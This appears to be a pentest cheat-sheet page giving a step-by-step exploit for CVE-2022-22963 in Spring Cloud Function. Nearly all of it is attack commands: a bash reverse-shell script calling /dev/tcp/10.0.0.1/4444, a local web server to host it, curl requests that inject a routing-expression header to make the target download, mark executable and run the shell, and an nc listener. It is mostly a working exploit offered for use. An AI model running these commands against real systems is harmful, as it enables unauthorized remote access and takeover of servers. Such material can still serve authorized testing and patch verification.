# Spring Cloud Function RCE

Spring Cloud Function is vulnerable to RCE (CVE-2022-22963)

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

First create a reverse shell script in local machine.

```
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Then start a web server for uploading it.

```
python3 -m http.server
```

Now remote code execution with target website as below.

```
curl -X POST  https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.0.0.1/shell -O /tmp/shell")' --data-raw 'data' -v
```

Our reverse shell script is uploaded.\
Start a listener in local machine.

```
nc -lvnp 4444
```

Remote code execution again to reverse shell.

```
# As needed
curl -X POST  https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/shell")' --data-raw 'data' -v

curl -X POST  https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell")' --data-raw 'data' -v
```

### References <a href="#references" id="references"></a>

* [me2nuk](https://github.com/me2nuk/CVE-2022-22963)
